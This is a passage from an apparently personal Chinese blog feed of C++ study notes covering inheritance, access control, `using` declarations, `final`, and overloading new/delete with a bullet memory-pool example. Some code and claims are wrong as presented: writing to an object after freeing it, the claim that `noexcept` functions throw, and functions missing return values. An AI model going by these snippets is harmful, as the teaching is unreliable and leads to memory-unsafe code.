src="/2022/06/29/Derivedclass/004.png" class=""><p>说明unsing修改成public了。</p><p>至于私有的成员，它都只能在类中访问了，即使被继承了，也还是不能访问，所以为了贯彻私有，using是改变不了private的属性成员。</p><p>你要真的想修改私有的，之前说过在public下定义一个函数，然后赋值。既然using能修改成员。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">son</span>: <span class="keyword">public</span> father&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    <span class="type">float</span> weight;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">set</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;         <span class="comment">//提供setter</span></span><br><span class="line">        num = x;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> num;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="type">int</span> height;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">grandson</span> : <span class="keyword">private</span> son&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> sex;</span><br><span class="line">    <span class="keyword">using</span> son::height;</span><br><span class="line">    <span class="keyword">using</span> son::age;</span><br><span class="line">    <span class="keyword">using</span> son::set;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="/2022/06/29/Derivedclass/005.png" class=""><p>这么操作也不是不行，就是勉强了点，而且需要人注意到这个东西。</p><p>get和set不常用还容易搞混~~~</p><hr><h2 id="继承访问属性的使用"><a href="#继承访问属性的使用" class="headerlink" title="继承访问属性的使用"></a>继承访问属性的使用</h2><p>使用不同的属性，肯定有不同的用处</p><p>对于private和protected而言，可以更好的封装基类。<br>在派生类作为基础在进行派生的时候提供继承控制。</p><ol><li>将保护属性为private的基类派生出来的派生类作为父类的时候，派生类继承但不能访问构建其父类的基类成员</li><li>将保护属性为protected的父类产生的子类作为基类的时候，派生类继承且可以访问其非私有成员。</li></ol><hr><h2 id="继承访问属性的选择"><a href="#继承访问属性的选择" class="headerlink" title="继承访问属性的选择"></a>继承访问属性的选择</h2><p>因为private的成员继承之后也不能访问，所以真的有需求的时候，我们就应该提供getter&#x2F;setter函数</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>对于类的继承方式，大多情况还是用的public，其它两种保留印象</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>类的继承</title>
      <link href="/2022/06/29/inherit/"/>
      <url>/2022/06/29/inherit/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>我们称已存在的用来派生新类的类为基类，又称为父类。由已存在的类派生出的新类称为派生类，又称为子类。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span>&lt;派生类名&gt;:&lt;继承方式&gt;&lt;基类名&gt;&#123;</span><br><span class="line">&lt;派生类新定义成员&gt;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">char</span> name[<span class="number">20</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">char</span> name[<span class="number">20</span>];</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    <span class="type">float</span> weight;</span><br><span class="line">    <span class="comment">//。。。。。</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>像这种其实有共同属性的时候，就可以通过继承。</p><ol><li>子类不能继承父类的构造函数、析构函数、重载赋值运算符</li><li>子类只能继承父类的成员变量以及常规成员函数</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">char</span> name[<span class="number">20</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son</span>: <span class="keyword">public</span> father&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    <span class="type">float</span> weight;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如何看是否继承了，最简单的就是看两个类的内存大小。</p><img src="/2022/06/29/inherit/000.png" class=""><p>看到father 20没问题，son是28？<br>从结构上看就只有俩成员int和float加在一起也是8，多余的20自然是从父类那边继承过来的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">grandson</span> : <span class="keyword">public</span> son&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> sex;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>再添加一个类继承son，看看内存变化</p><img src="/2022/06/29/inherit/001.png" class=""><p>结果是32，又多了一个4，这个4自然就是自带的属性sex。</p><hr><p>public继承，就只能继承到public下的成员</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">char</span> name[<span class="number">20</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son</span>: <span class="keyword">public</span> father&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    <span class="type">float</span> weight;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">grandson</span> : <span class="keyword">public</span> son&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> sex;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当son的成员变成私有的时候，由grandson构造的类对象就无法访问到其中的属性了</p><img src="/2022/06/29/inherit/002.png" class=""><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">son</span>: <span class="keyword">public</span> father&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    <span class="type">float</span> weight;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="type">int</span> height;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">char</span> name[<span class="number">20</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son</span>: <span class="keyword">public</span> father&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    <span class="type">float</span> weight;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">grandson</span> : <span class="keyword">public</span> son&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> sex;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="/2022/06/29/inherit/003.png" class=""><p><strong>私有的成员虽然继承之后不可访问，但是同样会占用内存。</strong></p><p>引出一个新的属性，<code>protected</code>，<br>它的作用在类中其实跟私有差不多，但是可以被类本身和友元函数调用。<br>当然最主要的是他可以被继承，只不过比较特别</p><img src="/2022/06/29/inherit/004.png" class=""><p>只能通过派生类或者说子类的成员函数中访问。</p><p>protected又称受保护的:</p><ol><li>可访问的范围比私有的大一点</li><li>除了基类就只能在派生类的成员函数中访问</li></ol><hr><h2 id="final"><a href="#final" class="headerlink" title="final"></a>final</h2><p>当类加了<code>final</code>修饰后，他就不能作为基类使用了。</p><img src="/2022/06/29/inherit/005.png" class=""><p>而且final比较有意思的这个关键字可以做变量名，他没有那么严格要求</p><img src="/2022/06/29/inherit/006.png" class=""><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>过一遍继承属性，这个还没区分当不是public继承基类的时候的区别。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>重载new/delete</title>
      <link href="/2022/06/28/operator7/"/>
      <url>/2022/06/28/operator7/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前说的都是运算符重载，new&#x2F;delete可能谁都不会想到跟运算符相关</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>看上去是个关键字，但分配内存也是跟运算相关。</p><p>至于游戏上的优化，大多都是内存上的优化，比如道具交互，枪械打架，都需要存储，然后取值计算。但是一个子弹类，都有不少因素，就导致计算的时候要考虑很多。那么计算量大了，内存频繁读写，就会导致速度降低了。<br>当然现在的机器配置基本都挺高了。这种轻量的他还是能处理的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">bullet</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">float</span> x;</span><br><span class="line"><span class="type">float</span> y;</span><br><span class="line"><span class="type">float</span> z;</span><br><span class="line"></span><br><span class="line"><span class="type">float</span> damage;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">bullet *shota = <span class="keyword">new</span> <span class="built_in">bullet</span>();</span><br><span class="line"><span class="keyword">delete</span> shota;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最常见的就是这样的，之所以动态分配，因为栈区一般都不大，没必要让这些都堆积在栈区，而且子弹用完就释放，除非换弹夹重新拉满。<br>还有一个原因，内存碎片，内存释放了，原有的内存就会空白留间隙，如果这个地方不够用，一般就挺难被重用。然后久了就要等大程序释放了。</p><p>反正底层实现是比较复杂的。动态分配都是由系统看着来。</p><p>那么重载new和delete就是变相的由人为去控制分配到堆区的时候。<br>new的时候</p><ol><li>先分配内存空间</li><li>然后调用构造</li><li>返回指针</li></ol><p>delete的时候</p><ol><li>调用析构函数</li><li>然后释放内存</li></ol><hr><p>内存分配在c++中是比较重要的部分，有的时候我们需要重载内存分配和释放，大部分时候是为了解决内存碎片的问题<br>new的六种形式：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span>* <span class="keyword">operator</span> <span class="title">new</span><span class="params">(<span class="type">size_t</span> size)</span></span>;</span><br><span class="line"><span class="type">void</span>* <span class="keyword">operator</span> <span class="keyword">new</span>[](<span class="type">size_t</span> size);</span><br><span class="line"><span class="function"><span class="type">void</span>* <span class="keyword">operator</span> <span class="title">new</span><span class="params">(<span class="type">size_t</span> size,<span class="type">const</span> std::<span class="type">nothrow_t</span>&amp;)</span> <span class="keyword">noexcept</span></span>;</span><br><span class="line"><span class="type">void</span>* <span class="keyword">operator</span> <span class="keyword">new</span>[](<span class="type">size_t</span> size,<span class="type">const</span> std::<span class="type">nothrow_t</span>&amp;) <span class="keyword">noexcept</span>;</span><br></pre></td></tr></table></figure><p>禁止重载的两种形式</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span>* <span class="keyword">operator</span> <span class="title">new</span><span class="params">(<span class="type">size_t</span> size,<span class="type">void</span> *p)</span><span class="keyword">noexcept</span></span>;</span><br><span class="line"><span class="type">void</span>* <span class="keyword">operator</span> <span class="keyword">new</span>[](<span class="type">size_t</span> size,<span class="type">void</span> *p)<span class="keyword">noexcept</span>;</span><br></pre></td></tr></table></figure><p>额带noexcept的是会抛出异常的。暂时先学简单的。</p><p>后面两种进制重载的方式则是在特定地址上分配</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bullet *bl = <span class="built_in">new</span> ((<span class="type">void</span> *)<span class="number">0x200000</span>) bullet[<span class="number">10</span>];</span><br></pre></td></tr></table></figure><p>这个眼下用不到，比较高级的用法。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">bullet</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">float</span> x;</span><br><span class="line"><span class="type">float</span> y;</span><br><span class="line"><span class="type">float</span> z;</span><br><span class="line"></span><br><span class="line"><span class="type">float</span> damage;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> *<span class="keyword">operator</span> <span class="title">new</span><span class="params">(<span class="type">size_t</span> size)</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> *bullet::<span class="keyword">operator</span> <span class="title">new</span><span class="params">(<span class="type">size_t</span> size)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/28/operator7/000.png" class=""><p>因为模板还是return nullptr；就相当于没分配，所以打印出来的是00000000。</p><p>所以return的指针决定了分配的内存地址。<br>改动一下试试</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> *bullet::<span class="keyword">operator</span> <span class="title">new</span><span class="params">(<span class="type">size_t</span> size)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> bullet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意，new自己是一个大毛病</strong></p><img src="/2022/06/28/operator7/001.png" class=""><p>栈溢出了。</p><p>因为bullet 重载了new ，然后又调用自己，就是相当于死循环了。</p><p>当然因为这个new的作用域在重载本身。你也可以设置全局作用域的new。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> *bullet::<span class="keyword">operator</span> <span class="title">new</span><span class="params">(<span class="type">size_t</span> size)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> ::<span class="keyword">new</span> <span class="type">char</span>[<span class="number">0x100</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过<code>::</code>调用全局的new分配一个内存空间。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> *bullet::<span class="keyword">operator</span> <span class="title">new</span><span class="params">(<span class="type">size_t</span> size)</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;size：&quot;</span> &lt;&lt; size &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> ::<span class="keyword">new</span> <span class="type">char</span>[size];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后这个size该通过什么传递？</p><img src="/2022/06/28/operator7/002.png" class=""><p>能看到size&#x3D;16.<br>这个细心点就看到了，我们的类中有四个float成员。<br>而我们<code>bullet *shota = new bullet;</code>就是变相的new了一个bullet类的内存。</p><p>然后让这个重载的new，分配到我们指定的地方。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *mem = <span class="keyword">new</span> <span class="type">char</span>[<span class="number">0x1000</span>];</span><br><span class="line"><span class="function"><span class="type">void</span> *bullet::<span class="keyword">operator</span> <span class="title">new</span><span class="params">(<span class="type">size_t</span> size)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> mem;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/28/operator7/003.png" class=""><p>通过这种方式，让shota分配到我们指定的mem上。<br>那么这种自定义的重载就完成了。</p><hr><p>new完了，就需要自己delete了。</p><p>与new不同，delete不需要返回什么，它只需要知道删除哪块内存空间就行。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="keyword">operator</span> <span class="title">delete</span><span class="params">(<span class="type">void</span> *space)</span> <span class="keyword">noexcept</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> bullet::<span class="keyword">operator</span> <span class="title">delete</span><span class="params">(<span class="type">void</span> *space)</span> <span class="keyword">noexcept</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;delete&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">delete</span> space;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接这样操作。。有点二百五。而且也犯了大毛病。。delete这里调用的是自己重载的，所以跟没发生差不多。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> bullet::<span class="keyword">operator</span> <span class="title">delete</span><span class="params">(<span class="type">void</span> *space)</span> <span class="keyword">noexcept</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;delete&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">::<span class="keyword">delete</span> space;</span><br><span class="line">space = <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是挺奇怪，执行的时候地址没有变化，顶多编译器提示delete之后这个变量是未初始化的。</p><img src="/2022/06/28/operator7/006.png" class=""><img src="/2022/06/28/operator7/007.png" class=""><p>按道理来讲我不但释放了，还主动置空了，他应该打印的是00000000才对。</p><p>重复delete的时候编译器也会报错，说明我的操作是生效的，但是打印的时候不对就很烦，</p><img src="/2022/06/28/operator7/008.png" class=""><p><strong>delete本质是释放内存，这里纠结地址了。。</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">bullet</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">float</span> x;</span><br><span class="line"><span class="type">float</span> y;</span><br><span class="line"><span class="type">float</span> z;</span><br><span class="line"></span><br><span class="line"><span class="type">float</span> damage;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> *<span class="keyword">operator</span> <span class="title">new</span><span class="params">(<span class="type">size_t</span> size)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="keyword">operator</span> <span class="title">delete</span><span class="params">(<span class="type">void</span> *space)</span> <span class="keyword">noexcept</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Bshow</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;x:&quot;</span> &lt;&lt; x &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;y:&quot;</span> &lt;&lt; y &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;z:&quot;</span> &lt;&lt; z &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;damage:&quot;</span> &lt;&lt; damage &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> *bullet::<span class="keyword">operator</span> <span class="title">new</span><span class="params">(<span class="type">size_t</span> size)</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;---new---&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> ::<span class="keyword">new</span> <span class="type">char</span>[size];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> bullet::<span class="keyword">operator</span> <span class="title">delete</span><span class="params">(<span class="type">void</span> *space)</span> <span class="keyword">noexcept</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;---delete---&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">bullet *tmp = (bullet*)space;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (space == <span class="literal">nullptr</span>)&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;已重置勿重复操作！&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">::<span class="keyword">delete</span> space;</span><br><span class="line">space = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">tmp-&gt;x = <span class="number">0</span>;</span><br><span class="line">tmp-&gt;y = <span class="number">0</span>;</span><br><span class="line">tmp-&gt;z = <span class="number">0</span>;</span><br><span class="line">tmp-&gt;damage = <span class="number">0.0</span>;</span><br><span class="line">tmp-&gt;<span class="built_in">Bshow</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/28/operator7/009.png" class=""><p>内存已经释放了，我们只需要重置对象数据就行。<br>而且重复delete的时候会报错，就说明那个地方已经没有内存可以释放了。</p><p>但其实重置放析构问题也不大，因为delete之前会调用析构然后释放内存</p><hr><img src="/2022/06/28/operator7/004.png" class=""><img src="/2022/06/28/operator7/005.png" class=""><p>为什么说new和delete的时候是staitc修饰的。</p><ol><li>new的时候类还没有分配内存空间，没有内存空间自然不会有this指针</li><li>delete阶段本身应该能用this指针，但是它在析构函数里面了，析构函数的目的就是释放内存，所以用不用this都不要紧</li></ol><p>重载的目的是为了更灵活，固定的模式太死板不利于创造。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> *<span class="keyword">operator</span> <span class="title">new</span><span class="params">(<span class="type">size_t</span> size, <span class="type">const</span> <span class="type">char</span> *txt)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="keyword">operator</span> <span class="title">delete</span><span class="params">(<span class="type">void</span> *space, <span class="type">size_t</span> size)</span> <span class="keyword">noexcept</span></span>;</span><br></pre></td></tr></table></figure><p>像这种额外传递参数的时候，就要实现运算符重载的函数重载哈哈。<br>而且注意，像这种肯定是要配套写的，不能在原有基础上改动，否则编译器很大概率不知道该调用谁合适，或者他就依你这个写的做模板，万一你传递的只是一个普通的也还是会报错。</p><p>有的时候为了灵活，我们更加希望有一块内存是我们控制的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *mem = <span class="keyword">new</span> <span class="type">char</span>[<span class="number">1000</span>*<span class="built_in">sizeof</span>(bullet)]&#123;&#125;;</span><br></pre></td></tr></table></figure><p>这块内存，就像子弹的弹夹，发射了之后还可以填充周而复始，就在这个弹夹里操作子弹，</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> *bullet::<span class="keyword">operator</span> <span class="title">new</span><span class="params">(<span class="type">size_t</span> size, <span class="type">const</span> <span class="type">char</span> *txt)</span></span>&#123;</span><br><span class="line">bullet *dat = (bullet*)mem;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++)&#123;</span><br><span class="line"><span class="keyword">if</span> (!dat[i].flag) <span class="keyword">return</span> &amp;dat[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>内存自然是要去mem里借了，但是如何取决于填充空白部分，那么子弹类应该就有标签一样的属性表示它是否发射。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> flag = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure><p>这也是flag的由来。那么为什么一开始要等于true，自然是表示未发射，至于改成false的时机</p><p>本意是放在delete的，但是delete释放前也会调用析构函数，那么放在析构函数是最为妥当的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 